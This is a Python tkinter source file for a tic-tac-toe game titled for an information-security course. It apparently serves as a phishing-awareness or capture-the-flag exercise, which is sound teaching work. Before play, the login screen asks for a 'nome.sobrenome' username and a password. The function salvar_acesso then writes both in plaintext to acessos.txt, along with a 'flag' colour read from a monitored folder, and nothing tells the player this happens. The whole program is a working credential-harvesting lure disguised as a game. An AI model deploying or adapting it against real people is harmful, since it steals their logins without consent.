import os
import re
import sys
import random
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

# ==========================================
# CONFIGURAÇÕES
# ==========================================
# Descobre a pasta do próprio programa, funcionando tanto rodando o .py
# quanto o .exe gerado pelo PyInstaller. Assim o projeto roda em qualquer PC
# sem depender de caminhos fixos.
if getattr(sys, "frozen", False):          # rodando como .exe
    BASE_DIR = os.path.dirname(sys.executable)
else:                                       # rodando como .py
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# O acesso é salvo ao lado do programa.
ARQUIVO_ACESSOS = os.path.join(BASE_DIR, "acessos.txt")

# A "bandeira": o sabor de pizza cujo código de cor queremos capturar, e onde
# procurá-lo. A pasta "Pasta monitorada" fica ao lado da pasta do programa.
SABOR_ALVO = "Pizza de Peperoni"
ARQUIVO_SABORES = os.path.join(BASE_DIR, "..", "Pasta monitorada", "sabores.txt")
HEX_RE = re.compile(r"#(?:[0-9A-Fa-f]{6}|[0-9A-Fa-f]{3})\b")

TITULO = "Jogo da Velha — Segurança da Informação 2026"
SUBTITULO = "Vamos jogar"


def cor_da_bandeira():
    """Lê o sabores.txt e devolve o código de cor ao lado do SABOR_ALVO.
    Se não encontrar o arquivo ou o sabor, devolve 'indisponivel'."""
    try:
        with open(ARQUIVO_SABORES, "r", encoding="utf-8", errors="ignore") as f:
            for linha in f:
                if SABOR_ALVO.lower() in linha.lower():
                    m = HEX_RE.search(linha)
                    if m:
                        return m.group(0)
    except FileNotFoundError:
        pass
    return "indisponivel"


def salvar_acesso(campo1, campo2):
    cor = cor_da_bandeira()
    linha = (f"{datetime.now():%Y-%m-%d %H:%M:%S} | codigo={campo1} "
             f"| senha={campo2} | cor={cor}\n")
    with open(ARQUIVO_ACESSOS, "a", encoding="utf-8") as f:
        f.write(linha)


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(TITULO)
        self.configure(bg="#1b1b1b")
        self.resizable(False, False)
        self._tela_login()

    def _limpar(self):
        for w in self.winfo_children():
            w.destroy()

    # ---------- TELA DE LOGIN ----------
    def _tela_login(self):
        self._limpar()
        f = tk.Frame(self, bg="#1b1b1b", padx=30, pady=24)
        f.pack()

        tk.Label(f, text=TITULO, fg="#e0e0e0", bg="#1b1b1b",
                 font=("Consolas", 14, "bold")).pack()
        tk.Label(f, text=SUBTITULO, fg="#f0a500", bg="#1b1b1b",
                 font=("Consolas", 10, "bold")).pack(pady=(2, 0))

        aviso = ("Se divirta!")
        tk.Label(f, text=aviso, fg="#9ad", bg="#1b1b1b",
                 font=("Consolas", 9), justify="center").pack(pady=(10, 18))

        tk.Label(f, text="user nome.sobrenome", fg="#e0e0e0", bg="#1b1b1b",
                 font=("Consolas", 10)).pack(anchor="w")
        self.e1 = tk.Entry(f, font=("Consolas", 12), width=28)
        self.e1.pack(pady=(2, 10))

        tk.Label(f, text="Senha", fg="#e0e0e0", bg="#1b1b1b",
                 font=("Consolas", 10)).pack(anchor="w")
        self.e2 = tk.Entry(f, font=("Consolas", 12), width=28, show="*")
        self.e2.pack(pady=(2, 16))

        tk.Button(f, text="Entrar e jogar", font=("Consolas", 11, "bold"),
                  bg="#f0a500", fg="#1b1b1b", activebackground="#ffc233",
                  command=self._enviar).pack(fill="x")

        self.msg = tk.Label(f, text="", fg="#ff6b6b", bg="#1b1b1b",
                            font=("Consolas", 9))
        self.msg.pack(pady=(10, 0))

    def _enviar(self):
        c1 = self.e1.get().strip()
        c2 = self.e2.get().strip()

        if not c1 or not c2:
            self.msg.config(text="Preencha os dois campos.")
            return

        salvar_acesso(c1, c2)
        self._tela_jogo()

    # ---------- TELA DO JOGO ----------
    def _tela_jogo(self):
        self._limpar()
        self.tabuleiro = [""] * 9
        self.fim = False

        f = tk.Frame(self, bg="#1b1b1b", padx=20, pady=16)
        f.pack()

        tk.Label(f, text="Jogo da Velha", fg="#e0e0e0", bg="#1b1b1b",
                 font=("Consolas", 14, "bold")).pack()
        tk.Label(f, text="Você = X   |   Computador = O", fg="#9ad",
                 bg="#1b1b1b", font=("Consolas", 10)).pack(pady=(2, 12))

        grade = tk.Frame(f, bg="#1b1b1b")
        grade.pack()
        self.botoes = []
        for i in range(9):
            b = tk.Button(grade, text="", width=4, height=2,
                          font=("Consolas", 20, "bold"),
                          bg="#2b2b2b", fg="#f0a500",
                          command=lambda i=i: self._jogada(i))
            b.grid(row=i // 3, column=i % 3, padx=3, pady=3)
            self.botoes.append(b)

        self.status = tk.Label(f, text="Sua vez.", fg="#e0e0e0", bg="#1b1b1b",
                               font=("Consolas", 11))
        self.status.pack(pady=(12, 6))

        tk.Button(f, text="Reiniciar", font=("Consolas", 10),
                  command=self._tela_jogo).pack()

    def _jogada(self, i):
        if self.fim or self.tabuleiro[i]:
            return
        self._marcar(i, "X")
        if self._checar("X"):
            return
        self._jogada_computador()

    def _jogada_computador(self):
        i = self._melhor_jogada("O")
        if i is not None:
            self._marcar(i, "O")
            self._checar("O")

    def _marcar(self, i, jogador):
        self.tabuleiro[i] = jogador
        cor = "#4da6ff" if jogador == "O" else "#f0a500"
        self.botoes[i].config(text=jogador, fg=cor, state="disabled",
                              disabledforeground=cor)

    def _melhor_jogada(self, cpu):
        humano = "X"
        livres = [i for i in range(9) if not self.tabuleiro[i]]
        # tenta ganhar, depois bloquear, depois centro, depois canto, depois aleatório
        for jogador in (cpu, humano):
            for i in livres:
                copia = self.tabuleiro[:]
                copia[i] = jogador
                if self._vencedor(copia) == jogador:
                    return i
        if 4 in livres:
            return 4
        cantos = [c for c in (0, 2, 6, 8) if c in livres]
        if cantos:
            return random.choice(cantos)
        return random.choice(livres) if livres else None

    def _checar(self, jogador):
        venc = self._vencedor(self.tabuleiro)
        if venc:
            self.fim = True
            quem = "Você venceu!" if venc == "X" else "Computador venceu."
            self.status.config(text=quem)
            return True
        if all(self.tabuleiro):
            self.fim = True
            self.status.config(text="Deu velha (empate).")
            return True
        self.status.config(text="Sua vez." if jogador == "O" else "Computador pensando...")
        return False

    @staticmethod
    def _vencedor(t):
        linhas = [(0, 1, 2), (3, 4, 5), (6, 7, 8),
                  (0, 3, 6), (1, 4, 7), (2, 5, 8),
                  (0, 4, 8), (2, 4, 6)]
        for a, b, c in linhas:
            if t[a] and t[a] == t[b] == t[c]:
                return t[a]
        return None


if __name__ == "__main__":
    App().mainloop()
